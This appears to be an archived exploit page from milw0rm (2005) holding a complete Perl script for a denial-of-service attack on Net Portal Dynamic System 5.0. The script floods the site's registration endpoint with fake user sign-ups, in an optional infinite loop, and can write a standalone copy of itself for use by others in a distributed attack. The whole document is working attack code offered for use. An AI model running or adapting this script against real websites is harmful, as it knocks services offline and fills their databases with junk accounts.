@@ -1,0 +1,148 @@
+<html>
+<head>
+<title>Net Portal Dynamic System <= 5.0 (register users) Denial of Service</title>
+<pre>
+#!/usr/bin/perl
+################################################################
+#Type|+ Register multiple users for Denial of Service
+#Vendor url|+ www.npds.org
+#Little description|+ NPDS (Net Portal Dynamic System) is a French(and now English !) GNU dynamic portal
+#Solution|+ None official but you can add a visual confirmation if you like php ;)
+#Worked on|+ Last version(5.0, tested), probably prior
+#Files|+ Exploit=npds50.pl     Bind=malicious_npds.pl     Log=log_npds_dos.txt
+#Credits|+ Vulnerability find and coded by DarkFig
+#Greetz|+ Acid root, [*BoD*] , Milw0rm.com (best website in the world !!) and all people who know me ;)
+#Note|+  Bind option if for DDoS attack | If the website send password to the email no registration but it add an email in the database (can make Dos !) ;) | Sorry for my bad english ^^
+################################################################
+use IO::Socket;
+if (@ARGV &lt; 7) {
+print q(
++------------------------------------------------------------------------+
++                       Net Portal Dynamic System &lt;5.0                   +
++                 Register multiple users Denial of Service              +
++------------------------------------------------------------------------+
++ Usage|npds50.pl &lt;host&gt; &lt;path&gt; &lt;port&gt; &lt;pwd_send&gt; &lt;nb_reg&gt; &lt;log&gt; &lt;bind&gt;  +
++------------------------------------------------------------------------+
++ &lt;pwd_send&gt; =&gt; Website send password to the email ? [Yes=1] [No=0]      +
++ &lt;port&gt; =&gt; The port of the website (default is 80)                      +
++ &lt;nb_loop&gt; =&gt; Number of registration [Infinite=loop]                    +
++ &lt;log&gt; =&gt; Log activity in a file [Yes=1] [No=0]                         +
++ &lt;bind&gt; =&gt; Generate a malicious file for DDOS [Yes=1] [No=0]            +
++------------------------------------------------------------------------+
++                        Found and coded by DarkFig                      +
++------------------------------------------------------------------------+
+); exit();}
+
+#Initializing data
+$host = $ARGV[0];
+$path = $ARGV[1];
+$port = $ARGV[2];
+$sendpwd = $ARGV[3];
+$nb_reg = $ARGV[4];
+$log = $ARGV[5];
+$bind = $ARGV[6];
+$x = 0;
+if($nb_reg eq &quot;loop&quot;) {$nb_reg = &quot;-5&quot;;}
+
+#If bind=yes
+if($bind eq &quot;1&quot;) {
+print q(
++-----------------------------------+
++  Net Portal Dynamic System &lt;5.0   +
++  Register multiple users for DoS  +
++    Found and coded by DarkFig     +
++-----------------------------------+);
+print &quot;\n   [+] Generate a malicious file...&quot;;
+open FILE, &quot;&gt;malicious_npds.pl&quot;;
+print FILE &quot;use IO::Socket;&quot;;
+print FILE &quot;\n&quot;; print FILE q($log = &quot;); print FILE &quot;$log&quot;; print FILE q(&quot;;);
+print FILE &quot;\n&quot;; print FILE q($host = &quot;); print FILE &quot;$host&quot;; print FILE q(&quot;;);
+print FILE &quot;\n&quot;; print FILE q($port = ); print FILE &quot;$port;&quot;;
+print FILE &quot;\n&quot;; print FILE q($nb_reg = ); print FILE &quot;$nb_reg;&quot;;
+print FILE &quot;\n&quot;; print FILE q($path = &quot;); print FILE &quot;$path&quot;; print FILE q(&quot;;);
+print FILE &quot;\n&quot;; print FILE q($x = 0;);
+print FILE &quot;\n&quot;; print FILE q(if($nb_reg eq &quot;loop&quot;){$nb_reg = &quot;-5&quot;;});
+print FILE &quot;\n&quot;;
+print FILE q(while($x != $nb_reg) {
+$email = &quot;godman&quot;.&quot;$x&quot;.&quot;%40hotmail.com&quot;;
+$pseudo = &quot;0rrn&quot;.&quot;$x&quot;.&quot;&amp;&quot;;
+$password = &quot;g0_odp4sswd&quot;;
+);
+if($sendpwd eq &quot;0&quot;){print FILE q($full_url = &quot;$path&quot;.&quot;user.php&quot;.&quot;?op=only_newuser&amp;uname=&quot;.&quot;$pseudo&quot;.&quot;name=&amp;email=&quot;.&quot;$email&quot;.&quot;&amp;user_avatar=blank.gif&amp;user_icq=&amp;url=&amp;user_from=&amp;user_occ=&amp;user_intrest=&amp;user_sig=&amp;user_aim=&amp;user_yim=&amp;user_msnm=&amp;user_viewemail=&amp;pass=&quot;.&quot;$password&quot;.&quot;&amp;user_lnl=1&amp;C1=&amp;C2=&amp;C3=&amp;C4=&amp;C5=&amp;C6=&amp;C7=&amp;C8=&amp;M1=&amp;M2=&amp;T1=17%2F10%2F2005&amp;T2=&amp;B1=&amp;op=finish&quot;;);}
+if($sendpwd eq &quot;1&quot;){print FILE q($full_url = &quot;$path&quot;.&quot;user.php&quot;.&quot;?op=only_newuser&amp;uname=&quot;.&quot;$pseudo&quot;.&quot;name=&amp;email=&quot;.&quot;$email&quot;.&quot;&amp;user_avatar=blank.gif&amp;user_icq=&amp;url=&amp;user_from=&amp;user_occ=&amp;user_intrest=&amp;user_sig=&amp;user_aim=&amp;user_yim=&amp;user_msnm=&amp;user_viewemail=&amp;user_lnl=1&amp;C1=&amp;C2=&amp;C3=&amp;C4=&amp;C5=&amp;C6=&amp;C7=&amp;C8=&amp;M1=&amp;M2=&amp;T1=17%2F10%2F2005&amp;T2=&amp;B1=&amp;op=finish&quot;;);}
+print FILE q(
+my $sock = new IO::Socket::INET (PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;$port&quot;,Proto =&gt; &quot;tcp&quot;,);
+die &quot;\n[-] Can't connect to the host, maybe Dosed !\n&quot; unless $sock;
+print $sock &quot;GET $full_url HTTP/1.1\n&quot;;
+print $sock &quot;Host: $host\n&quot;;
+close($sock);
+if($log eq &quot;1&quot;) {
+open FILE, &quot;&gt;log_npds_dos.txt&quot;;
+print FILE q(
++-----------------------------------+
++  Net Portal Dynamic System &lt;5.0   +
++  Register multiple users for DoS  +
++       ~~Activity logged~~         +
++-----------------------------------+);
+print FILE &quot;\n        Host| $host&quot;;
+print FILE &quot;\n        Path| $path&quot;;
+print FILE &quot;\n        Port| $port&quot;;
+print FILE &quot;\n        Registration| $x&quot;;
+print FILE &quot;\n+-----------------------------------+&quot;;
+print FILE &quot;\n+        Logged by DarkFig          +&quot;;
+print FILE &quot;\n+-----------------------------------+&quot;;
+close FILE;}
+$x++;
+syswrite STDOUT, &quot;-$x&quot;;}); close FILE;
+print &quot;\n   [+] Malicious file generate !&quot;;
+print &quot;\n+-----------------------------------+\n&quot;;
+exit();}
+
+#If bind=no
+if($bind eq &quot;0&quot;) {
+print q(
++-----------------------------------+
++  Net Portal Dynamic System &lt;5.0   +
++  Register multiple users for DoS  +
++    Found and coded by DarkFig     +
++-----------------------------------+);
+print &quot;\n[~] Connecting to the host..&quot;;
+my $sock = new IO::Socket::INET (PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;$port&quot;,Proto =&gt; &quot;tcp&quot;,);
+die &quot;\n[-] Can't connect to the host: $!\n&quot; unless $sock; close($sock);
+print &quot;\n[+] Connected !&quot;;
+print &quot;\n[~] Sending data...&quot;;
+print &quot;\n[+] Number of registration\n&quot;;
+while($x != $nb_reg) {
+$email = &quot;ownv&quot;.&quot;$x&quot;.&quot;%40hotmail.com&quot;;
+$pseudo = &quot;0orn&quot;.&quot;$x&quot;.&quot;&amp;&quot;;
+$password = &quot;g0_odp4sswd&quot;;
+if($sendpwd eq &quot;0&quot;){$full_url = &quot;$path&quot;.&quot;user.php&quot;.&quot;?op=only_newuser&amp;uname=&quot;.&quot;$pseudo&quot;.&quot;name=&amp;email=&quot;.&quot;$email&quot;.&quot;&amp;user_avatar=blank.gif&amp;user_icq=&amp;url=&amp;user_from=&amp;user_occ=&amp;user_intrest=&amp;user_sig=&amp;user_aim=&amp;user_yim=&amp;user_msnm=&amp;user_viewemail=&amp;pass=&quot;.&quot;$password&quot;.&quot;&amp;user_lnl=1&amp;C1=&amp;C2=&amp;C3=&amp;C4=&amp;C5=&amp;C6=&amp;C7=&amp;C8=&amp;M1=&amp;M2=&amp;T1=17%2F10%2F2005&amp;T2=&amp;B1=&amp;op=finish&quot;;}
+if($sendpwd eq &quot;1&quot;){$full_url = &quot;$path&quot;.&quot;user.php&quot;.&quot;?op=only_newuser&amp;uname=&quot;.&quot;$pseudo&quot;.&quot;name=&amp;email=&quot;.&quot;$email&quot;.&quot;&amp;user_avatar=blank.gif&amp;user_icq=&amp;url=&amp;user_from=&amp;user_occ=&amp;user_intrest=&amp;user_sig=&amp;user_aim=&amp;user_yim=&amp;user_msnm=&amp;user_viewemail=&amp;user_lnl=1&amp;C1=&amp;C2=&amp;C3=&amp;C4=&amp;C5=&amp;C6=&amp;C7=&amp;C8=&amp;M1=&amp;M2=&amp;T1=17%2F10%2F2005&amp;T2=&amp;B1=&amp;op=finish&quot;;}
+my $sock = new IO::Socket::INET (PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;$port&quot;,Proto =&gt; &quot;tcp&quot;,);
+die &quot;\n[-] Can't connect to the host, maybe Dosed !\n&quot; unless $sock;
+print $sock &quot;GET $full_url HTTP/1.1\n&quot;;
+print $sock &quot;Host: $host\n&quot;;
+close($sock);
+if($log eq &quot;1&quot;) {
+open FILE, &quot;&gt;log_npds_dos.txt&quot;;
+print FILE q(
++-----------------------------------+
++  Net Portal Dynamic System &lt;5.0   +
++  Register multiple users for DoS  +
++       ~~Activity logged~~         +
++-----------------------------------+);
+print FILE &quot;\n        Host| $host&quot;;
+print FILE &quot;\n        Path| $path&quot;;
+print FILE &quot;\n        Port| $port&quot;;
+print FILE &quot;\n        Registration| $x&quot;;
+print FILE &quot;\n+-----------------------------------+&quot;;
+print FILE &quot;\n+        Logged by DarkFig          +&quot;;
+print FILE &quot;\n+-----------------------------------+&quot;;
+close FILE;}
+$x++;
+syswrite STDOUT, &quot;-$x&quot;;}}
+
+# milw0rm.com [2005-10-21]
+</pre>
+</html>
+
